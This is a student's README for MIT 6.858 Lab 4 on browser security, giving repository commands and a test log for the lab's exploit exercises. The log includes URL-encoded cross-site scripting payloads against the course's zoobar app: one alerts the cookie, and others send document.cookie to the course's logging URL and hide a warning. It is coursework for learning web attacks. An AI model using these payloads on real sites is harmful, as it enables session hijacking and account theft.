# Lab 4: Browser Security

This is the fourth lab from the MIT 6.858 Computer Security Systems class which is available for free on [MIT OpenCourseWare](https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/). I followed this online course independently and completed the labs on my own VM.

[Lab 4 Instructions](https://css.csail.mit.edu/6.858/2020/labs/lab4.html) 

My solutions to the exercises in this lab can be found in the files prefixed with `answer-`.

Use the following commands to run the test suite:

```xslt
$ git clone https://github.com/NolanJMcCafferty/MIT-6.858-Computer-Systems-Security
$ cd MIT-6.858-Computer-Systems-Security
$ git checkout lab4
$ make check
```

Test Results: 
 
(output lines with `[ ???? ]` indicate that the result must be checked manually by the course grader)

```$xslt
student@6858-v20:~/lab$ make check
./check-lab4.sh
Generating reference images...
Registering as grader, graderpassword
Registering as attacker, attackerpassword
Registering as grader1, password1
Registering as grader2, password2
Registering as grader3, password3
[ INFO ]: Testing exploit for Exercise 1...
Registering as grader, graderpassword
Registering as attacker, attackerpassword
Expecting cookie: grader#1477552cbb6dfd457241c2cc56bc3e90
[ PASS ]: alert contains: grader#1477552cbb6dfd457241c2cc56bc3e90
[ INFO ]: Testing exploit for Exercise 2...
Registering as grader, graderpassword
Registering as attacker, attackerpassword
[ ???? ]: Check log (https://css.csail.mit.edu/6.858/2020/labs/log.php), expecting string 'grader#42e300b5713788f6b0b8def8fdb7b841'
[ INFO ]: Testing exploit for Exercise 3...
Found URL: http://localhost:8080/zoobar/index.cgi/users?user=%22%20onfocus=%22alert(document.cookie)%22%20autofocus=%22&random=3
Registering as grader, graderpassword
Registering as attacker, attackerpassword
Expecting cookie: grader#fadb2d9c086b832f876cd867e0afdce4
[ PASS ]: alert contains: grader#fadb2d9c086b832f876cd867e0afdce4
[ INFO ]: Testing exploit for Exercise 4...
Found URL: http://localhost:8080/zoobar/index.cgi/users?user=%22%20onfocus=%22var%20img%20%3D%20new%20Image()%3Bimg.src%3D%27https%3A%2F%2Fcss.csail.mit.edu%2F6.858%2F2020%2Flabs%2Flog.php%3F%27%20%2B%20%27id%3Drollhens%27%20%2B%20%27%26payload%3D%27%20%2B%20encodeURIComponent(document.cookie)%20%2B%20%27%26random%3D%27%20%2B%20Math.random()%3Bimg.click()%3B%22%20autofocus=%22&random=3
Registering as grader, graderpassword
Registering as attacker, attackerpassword
[ ???? ]: Check log (https://css.csail.mit.edu/6.858/2020/labs/log.php), expecting string 'grader#4a37759281624413966ac76dbe6a7010'
[ INFO ]: Testing exploit for Exercise 5...
Found URL: http://localhost:8080/zoobar/index.cgi/users?user=%22%20onfocus%3D%22var%20img%20%3D%20new%20Image()%3Bimg.src%3D%27https%3A%2F%2Fcss.csail.mit.edu%2F6.858%2F2020%2Flabs%2Flog.php%3F%27%20%2B%20%27id%3Drollhens%27%20%2B%20%27%26payload%3D%27%20%2B%20encodeURIComponent(document.cookie)%20%2B%20%27%26random%3D%27%20%2B%20Math.random()%3Bimg.click()%3Bwindow.onload%20%3D%20function()%20%7Bdocument.getElementsByClassName(%27warning%27)%5B0%5D.style.display%20%3D%20%27none%27%3B%7D%22%20autofocus%3D%22
Registering as grader, graderpassword
Registering as attacker, attackerpassword
[ ???? ]: Check log (https://css.csail.mit.edu/6.858/2020/labs/log.php), expecting string 'grader#e2a2cebedd95ec484acb6574237c2f8c'
[ PASS ]: ./lab4-tests/answer-5.png matched reference image (557200 non-background pixels)
[ INFO ]: Testing exploit for Exercise 6...
Registering as grader, graderpassword
Registering as attacker, attackerpassword
[ PASS ]: grader zoobar count
[ PASS ]: attacker zoobar count
[ INFO ]: Testing exploit for Exercise 7...
Registering as grader, graderpassword
Registering as attacker, attackerpassword
[ PASS ]: grader zoobar count
[ PASS ]: attacker zoobar count
[ INFO ]: Testing exploit for Exercise 8...
Registering as grader, graderpassword
Registering as attacker, attackerpassword
Loading attacker page. If you get a timeout here you're not redirecting to http://css.csail.mit.edu/6.858/2020/.
[ PASS ]: visited final page
[ PASS ]: grader zoobar count
[ PASS ]: attacker zoobar count
```
